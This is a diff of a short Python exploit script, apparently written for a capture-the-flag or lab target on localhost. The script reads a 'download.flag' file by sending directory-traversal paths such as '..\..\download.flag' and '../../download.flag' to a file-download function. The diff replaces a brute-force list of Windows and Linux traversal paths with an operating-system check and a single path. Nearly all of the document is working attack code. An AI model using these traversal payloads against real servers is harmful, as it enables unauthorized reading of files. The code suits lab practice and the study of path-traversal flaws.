@@ -17,45 +17,34 @@ def download_file(url, path):
         return None
 
 
+def check_os_type(url):
+    test_path = "Download.flag"
+    result = download_file(url, test_path)
+    return "windows" if result else "linux"
+
+
 def read_flag(url):
-    win_paths = [
-        "..\\..\\..\\..\\download.flag",
-        "..\\..\\..\\download.flag",
-        "..\\..\\..\\..\\..\\download.flag",
-        "..\\..\\download.flag"
-    ]
+    os_type = check_os_type(url)
 
-    for path in win_paths:
-        flag_content = download_file(url, path)
-        if flag_content:
-            print(flag_content)
-            return flag_content
+    if os_type == "windows":
+        path = "..\\..\\download.flag"
+    else:
+        path = "../../download.flag"
 
-    linux_paths = [
-        "../../../../download.flag",
-        "../../../download.flag",
-        "../../../../../download.flag",
-        "../../download.flag"
-    ]
-
-    for path in linux_paths:
-        flag_content = download_file(url, path)
-        if flag_content:
-            print(flag_content)
-            return flag_content
+    flag_content = download_file(url, path)
+    if flag_content:
+        print(flag_content)
+        return flag_content
 
     return None
 
-def main():
-    if len(sys.argv) > 1:
-        target_url = sys.argv[1]
-    else:
-        target_url = "http://127.0.0.1:8080"
 
-    flag = read_flag(target_url)
+if len(sys.argv) > 1:
+    target_url = sys.argv[1]
+else:
+    target_url = "http://127.0.0.1:8080"
 
-    if not flag:
-        print("failed")
+flag = read_flag(target_url)
 
-if __name__ == "__main__":
-    main()
+if not flag:
+    print("failed")
